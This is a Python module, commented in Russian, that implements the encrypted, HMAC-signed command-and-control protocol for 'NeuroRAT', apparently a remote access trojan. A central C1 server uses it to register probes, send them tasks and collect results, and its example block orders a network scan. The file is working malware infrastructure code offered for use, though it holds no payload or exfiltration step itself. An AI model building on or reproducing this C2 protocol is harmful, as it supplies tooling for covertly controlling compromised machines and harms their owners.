#!/usr/bin/env python3
"""
Протокол связи для двухуровневой архитектуры NeuroRAT (C1 + Зонды)
Обеспечивает защищенный обмен данными между центральным сервером C1 и зондами
"""

import json
import time
import uuid
import base64
import hmac
import hashlib
import os
from enum import Enum
from typing import Dict, Any, List, Optional, Union
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend

class MessageType(Enum):
    """Типы сообщений для коммуникации между C1 и зондами"""
    COMMAND = "command"            # Команда от C1 к зонду
    RESULT = "result"              # Результат выполнения команды от зонда к C1
    HEARTBEAT = "heartbeat"        # Проверка соединения
    REGISTRATION = "registration"  # Регистрация нового зонда
    AUTH = "auth"                  # Аутентификация
    STATUS = "status"              # Статус зонда
    ERROR = "error"                # Ошибка

class TaskPriority(Enum):
    """Приоритеты для задач"""
    LOW = 0
    MEDIUM = 1
    HIGH = 2
    CRITICAL = 3

class TaskStatus(Enum):
    """Статусы выполнения задач"""
    PENDING = "pending"       # Ожидает выполнения
    RUNNING = "running"       # Выполняется
    COMPLETED = "completed"   # Успешно выполнена
    FAILED = "failed"         # Выполнение не удалось
    TIMEOUT = "timeout"       # Истекло время выполнения
    CANCELED = "canceled"     # Отменена

class ZondMessage:
    """
    Класс для создания и обработки сообщений между C1 и зондами
    """
    def __init__(
        self, 
        message_type: MessageType, 
        data: Dict[str, Any], 
        sender_id: str,
        receiver_id: Optional[str] = None,
        message_id: Optional[str] = None,
        timestamp: Optional[float] = None,
        signature: Optional[str] = None
    ):
        """
        Инициализация сообщения протокола
        
        Args:
            message_type: Тип сообщения
            data: Полезная нагрузка сообщения
            sender_id: ID отправителя
            receiver_id: ID получателя (опционально)
            message_id: ID сообщения (если не указано, генерируется)
            timestamp: Временная метка (если не указано, берется текущее время)
            signature: Подпись сообщения для проверки подлинности
        """
        self.message_type = message_type
        self.data = data
        self.sender_id = sender_id
        self.receiver_id = receiver_id
        self.message_id = message_id or str(uuid.uuid4())
        self.timestamp = timestamp or time.time()
        self.signature = signature
    
    def to_dict(self) -> Dict[str, Any]:
        """Преобразование сообщения в словарь"""
        return {
            "message_type": self.message_type.value,
            "data": self.data,
            "sender_id": self.sender_id,
            "receiver_id": self.receiver_id,
            "message_id": self.message_id,
            "timestamp": self.timestamp,
            "signature": self.signature
        }
    
    def to_json(self) -> str:
        """Преобразование сообщения в JSON"""
        return json.dumps(self.to_dict())
    
    @classmethod
    def from_dict(cls, data: Dict[str, Any]) -> 'ZondMessage':
        """Создание сообщения из словаря"""
        return cls(
            message_type=MessageType(data["message_type"]),
            data=data["data"],
            sender_id=data["sender_id"],
            receiver_id=data.get("receiver_id"),
            message_id=data["message_id"],
            timestamp=data["timestamp"],
            signature=data.get("signature")
        )
    
    @classmethod
    def from_json(cls, json_str: str) -> 'ZondMessage':
        """Создание сообщения из JSON"""
        data = json.loads(json_str)
        return cls.from_dict(data)
    
    def sign(self, secret_key: str) -> None:
        """
        Подписывает сообщение с использованием секретного ключа
        
        Args:
            secret_key: Секретный ключ для создания подписи
        """
        # Создаем строку для подписи: message_type + message_id + timestamp + data
        message_parts = [
            self.message_type.value,
            self.message_id,
            str(self.timestamp),
            json.dumps(self.data, sort_keys=True)
        ]
        message_to_sign = ":".join(message_parts)
        
        # Создаем HMAC подпись
        hmac_obj = hmac.new(
            secret_key.encode(), 
            message_to_sign.encode(), 
            hashlib.sha256
        )
        self.signature = base64.b64encode(hmac_obj.digest()).decode()
    
    def verify(self, secret_key: str) -> bool:
        """
        Проверяет подпись сообщения
        
        Args:
            secret_key: Секретный ключ для проверки подписи
            
        Returns:
            bool: True если подпись верна, иначе False
        """
        if not self.signature:
            return False
        
        # Создаем строку для проверки подписи
        message_parts = [
            self.message_type.value,
            self.message_id,
            str(self.timestamp),
            json.dumps(self.data, sort_keys=True)
        ]
        message_to_verify = ":".join(message_parts)
        
        # Создаем HMAC подпись
        hmac_obj = hmac.new(
            secret_key.encode(), 
            message_to_verify.encode(), 
            hashlib.sha256
        )
        expected_signature = base64.b64encode(hmac_obj.digest()).decode()
        
        # Проверяем подпись
        return hmac.compare_digest(self.signature, expected_signature)


class ZondTask:
    """
    Класс для представления задачи, выполняемой зондом
    """
    def __init__(
        self,
        task_id: str,
        command: str,
        parameters: Dict[str, Any] = None,
        priority: TaskPriority = TaskPriority.MEDIUM,
        timeout: Optional[int] = None,
        status: TaskStatus = TaskStatus.PENDING,
        result: Optional[Dict[str, Any]] = None,
        created_at: Optional[float] = None,
        updated_at: Optional[float] = None,
        zond_id: Optional[str] = None
    ):
        """
        Инициализация задачи
        
        Args:
            task_id: Уникальный идентификатор задачи
            command: Команда для выполнения
            parameters: Параметры команды
            priority: Приоритет задачи
            timeout: Таймаут выполнения в секундах (None - без ограничения)
            status: Статус задачи
            result: Результат выполнения задачи
            created_at: Время создания задачи
            updated_at: Время последнего обновления задачи
            zond_id: ID зонда, который выполняет задачу
        """
        self.task_id = task_id
        self.command = command
        self.parameters = parameters or {}
        self.priority = priority
        self.timeout = timeout
        self.status = status
        self.result = result
        self.created_at = created_at or time.time()
        self.updated_at = updated_at or time.time()
        self.zond_id = zond_id
    
    def to_dict(self) -> Dict[str, Any]:
        """Преобразование задачи в словарь"""
        return {
            "task_id": self.task_id,
            "command": self.command,
            "parameters": self.parameters,
            "priority": self.priority.value,
            "timeout": self.timeout,
            "status": self.status.value,
            "result": self.result,
            "created_at": self.created_at,
            "updated_at": self.updated_at,
            "zond_id": self.zond_id
        }
    
    @classmethod
    def from_dict(cls, data: Dict[str, Any]) -> 'ZondTask':
        """Создание задачи из словаря"""
        return cls(
            task_id=data["task_id"],
            command=data["command"],
            parameters=data.get("parameters", {}),
            priority=TaskPriority(data["priority"]),
            timeout=data.get("timeout"),
            status=TaskStatus(data["status"]),
            result=data.get("result"),
            created_at=data["created_at"],
            updated_at=data["updated_at"],
            zond_id=data.get("zond_id")
        )
    
    def update_status(self, status: TaskStatus, result: Optional[Dict[str, Any]] = None) -> None:
        """
        Обновляет статус задачи и, опционально, результат
        
        Args:
            status: Новый статус задачи
            result: Результат выполнения задачи (если есть)
        """
        self.status = status
        if result is not None:
            self.result = result
        self.updated_at = time.time()


class ProtocolCrypto:
    """
    Класс для шифрования и дешифрования сообщений протокола
    Использует AES-256-CBC с PKCS7 паддингом
    """
    def __init__(self, encryption_key: bytes):
        """
        Инициализация криптографического модуля
        
        Args:
            encryption_key: 32-байтовый ключ шифрования (для AES-256)
        """
        if len(encryption_key) != 32:
            raise ValueError("Ключ шифрования должен быть 32 байта (256 бит)")
        
        self.encryption_key = encryption_key
        self.backend = default_backend()
        self.padder = padding.PKCS7(128)
    
    def encrypt(self, data: str) -> str:
        """
        Шифрует данные
        
        Args:
            data: Строка данных для шифрования
            
        Returns:
            str: Зашифрованные данные в формате base64
        """
        # Генерируем случайный IV
        iv = os.urandom(16)
        
        # Создаем шифр
        cipher = Cipher(
            algorithms.AES(self.encryption_key),
            modes.CBC(iv),
            backend=self.backend
        )
        encryptor = cipher.encryptor()
        
        # Добавляем паддинг и шифруем
        padder = self.padder.padder()
        padded_data = padder.update(data.encode()) + padder.finalize()
        encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
        
        # Объединяем IV и зашифрованные данные и кодируем в base64
        result = base64.b64encode(iv + encrypted_data).decode()
        return result
    
    def decrypt(self, data: str) -> str:
        """
        Дешифрует данные
        
        Args:
            data: Зашифрованные данные в формате base64
            
        Returns:
            str: Расшифрованные данные
        """
        # Декодируем из base64
        raw_data = base64.b64decode(data)
        
        # Извлекаем IV (первые 16 байт)
        iv = raw_data[:16]
        encrypted_data = raw_data[16:]
        
        # Создаем шифр
        cipher = Cipher(
            algorithms.AES(self.encryption_key),
            modes.CBC(iv),
            backend=self.backend
        )
        decryptor = cipher.decryptor()
        
        # Дешифруем и удаляем паддинг
        padded_data = decryptor.update(encrypted_data) + decryptor.finalize()
        unpadder = self.padder.unpadder()
        data = unpadder.update(padded_data) + unpadder.finalize()
        
        return data.decode()


class ZondProtocol:
    """
    Основной класс протокола связи между C1 и зондами
    """
    def __init__(
        self, 
        agent_id: str, 
        secret_key: str, 
        encryption_key: Optional[str] = None
    ):
        """
        Инициализация протокола
        
        Args:
            agent_id: Идентификатор агента (C1 или зонда)
            secret_key: Секретный ключ для подписи сообщений
            encryption_key: Ключ шифрования (если None, шифрование не используется)
        """
        self.agent_id = agent_id
        self.secret_key = secret_key
        self.crypto = None
        
        if encryption_key:
            # Преобразуем ключ в 32-байтовый для AES-256
            key_bytes = hashlib.sha256(encryption_key.encode()).digest()
            self.crypto = ProtocolCrypto(key_bytes)
    
    def create_message(
        self, 
        message_type: MessageType, 
        data: Dict[str, Any],
        receiver_id: Optional[str] = None
    ) -> ZondMessage:
        """
        Создает новое сообщение
        
        Args:
            message_type: Тип сообщения
            data: Данные сообщения
            receiver_id: ID получателя (опционально)
            
        Returns:
            ZondMessage: Созданное сообщение с подписью
        """
        message = ZondMessage(
            message_type=message_type,
            data=data,
            sender_id=self.agent_id,
            receiver_id=receiver_id
        )
        
        # Подписываем сообщение
        message.sign(self.secret_key)
        
        return message
    
    def create_command(
        self, 
        command: str,
        parameters: Dict[str, Any],
        zond_id: str,
        task_id: Optional[str] = None,
        priority: TaskPriority = TaskPriority.MEDIUM,
        timeout: Optional[int] = None
    ) -> ZondMessage:
        """
        Создает сообщение с командой для зонда
        
        Args:
            command: Команда для выполнения
            parameters: Параметры команды
            zond_id: ID зонда-получателя
            task_id: ID задачи (генерируется, если не указан)
            priority: Приоритет задачи
            timeout: Таймаут выполнения в секундах
            
        Returns:
            ZondMessage: Сообщение с командой
        """
        task_id = task_id or str(uuid.uuid4())
        
        task = ZondTask(
            task_id=task_id,
            command=command,
            parameters=parameters,
            priority=priority,
            timeout=timeout,
            zond_id=zond_id
        )
        
        return self.create_message(
            message_type=MessageType.COMMAND,
            data={"task": task.to_dict()},
            receiver_id=zond_id
        )
    
    def create_result(
        self,
        task_id: str,
        status: TaskStatus,
        result_data: Dict[str, Any],
        receiver_id: str
    ) -> ZondMessage:
        """
        Создает сообщение с результатом выполнения команды
        
        Args:
            task_id: ID задачи
            status: Статус выполнения
            result_data: Данные результата
            receiver_id: ID получателя (обычно C1)
            
        Returns:
            ZondMessage: Сообщение с результатом
        """
        return self.create_message(
            message_type=MessageType.RESULT,
            data={
                "task_id": task_id,
                "status": status.value,
                "result": result_data
            },
            receiver_id=receiver_id
        )
    
    def create_heartbeat(self, receiver_id: Optional[str] = None) -> ZondMessage:
        """
        Создает сообщение heartbeat для проверки соединения
        
        Args:
            receiver_id: ID получателя (опционально)
            
        Returns:
            ZondMessage: Heartbeat сообщение
        """
        return self.create_message(
            message_type=MessageType.HEARTBEAT,
            data={"timestamp": time.time()},
            receiver_id=receiver_id
        )
    
    def create_registration(
        self,
        system_info: Dict[str, Any],
        capabilities: List[str],
        receiver_id: str
    ) -> ZondMessage:
        """
        Создает сообщение регистрации нового зонда
        
        Args:
            system_info: Информация о системе зонда
            capabilities: Список возможностей зонда
            receiver_id: ID получателя (C1)
            
        Returns:
            ZondMessage: Сообщение регистрации
        """
        return self.create_message(
            message_type=MessageType.REGISTRATION,
            data={
                "system_info": system_info,
                "capabilities": capabilities
            },
            receiver_id=receiver_id
        )
    
    def process_message(self, message_data: Union[str, Dict[str, Any]]) -> Optional[ZondMessage]:
        """
        Обрабатывает полученное сообщение
        
        Args:
            message_data: Сообщение в виде строки JSON или словаря
            
        Returns:
            Optional[ZondMessage]: Обработанное сообщение или None, если сообщение недействительно
        """
        try:
            # Преобразуем входные данные в объект ZondMessage
            if isinstance(message_data, str):
                message = ZondMessage.from_json(message_data)
            else:
                message = ZondMessage.from_dict(message_data)
            
            # Проверяем подпись
            if not message.verify(self.secret_key):
                print(f"Неверная подпись сообщения: {message.message_id}")
                return None
            
            # Проверяем, предназначено ли сообщение для этого агента
            if message.receiver_id and message.receiver_id != self.agent_id:
                print(f"Сообщение не для этого агента: {message.message_id}")
                return None
            
            return message
        
        except Exception as e:
            print(f"Ошибка обработки сообщения: {str(e)}")
            return None
    
    def encrypt_message(self, message: ZondMessage) -> str:
        """
        Шифрует сообщение перед отправкой
        
        Args:
            message: Сообщение для шифрования
            
        Returns:
            str: Зашифрованное сообщение
        """
        if not self.crypto:
            # Если шифрование не настроено, возвращаем сообщение как есть
            return message.to_json()
        
        # Шифруем JSON-представление сообщения
        json_data = message.to_json()
        encrypted_data = self.crypto.encrypt(json_data)
        
        return encrypted_data
    
    def decrypt_message(self, encrypted_data: str) -> Optional[ZondMessage]:
        """
        Дешифрует полученное сообщение
        
        Args:
            encrypted_data: Зашифрованное сообщение
            
        Returns:
            Optional[ZondMessage]: Расшифрованное сообщение или None в случае ошибки
        """
        if not self.crypto:
            # Если шифрование не настроено, пытаемся обработать как есть
            return self.process_message(encrypted_data)
        
        try:
            # Дешифруем данные
            json_data = self.crypto.decrypt(encrypted_data)
            
            # Обрабатываем дешифрованное сообщение
            return self.process_message(json_data)
        
        except Exception as e:
            print(f"Ошибка дешифрования сообщения: {str(e)}")
            return None


# Пример использования:
if __name__ == "__main__":
    # Создаем протокол для C1
    c1_protocol = ZondProtocol(
        agent_id="c1_server", 
        secret_key="shared_secret_key", 
        encryption_key="encryption_key_example"
    )
    
    # Создаем протокол для зонда
    zond_protocol = ZondProtocol(
        agent_id="zond_123", 
        secret_key="shared_secret_key", 
        encryption_key="encryption_key_example"
    )
    
    # C1 отправляет команду на зонд
    command_message = c1_protocol.create_command(
        command="scan_network",
        parameters={"target": "192.168.1.0/24", "ports": [80, 443]},
        zond_id="zond_123",
        priority=TaskPriority.HIGH,
        timeout=300
    )
    
    # Шифруем сообщение для передачи
    encrypted_command = c1_protocol.encrypt_message(command_message)
    print(f"Зашифрованная команда: {encrypted_command[:50]}...")
    
    # Зонд получает и дешифрует сообщение
    received_command = zond_protocol.decrypt_message(encrypted_command)
    
    if received_command:
        print(f"Зонд получил команду: {received_command.data}")
        
        # Зонд отправляет результат выполнения
        result_message = zond_protocol.create_result(
            task_id=received_command.data["task"]["task_id"],
            status=TaskStatus.COMPLETED,
            result_data={"open_ports": {"192.168.1.1": [80, 443]}},
            receiver_id="c1_server"
        )
        
        # Шифруем результат для передачи
        encrypted_result = zond_protocol.encrypt_message(result_message)
        print(f"Зашифрованный результат: {encrypted_result[:50]}...")
        
        # C1 получает и дешифрует результат
        received_result = c1_protocol.decrypt_message(encrypted_result)
        
        if received_result:
            print(f"C1 получил результат: {received_result.data}")
    else:
        print("Ошибка при получении команды") 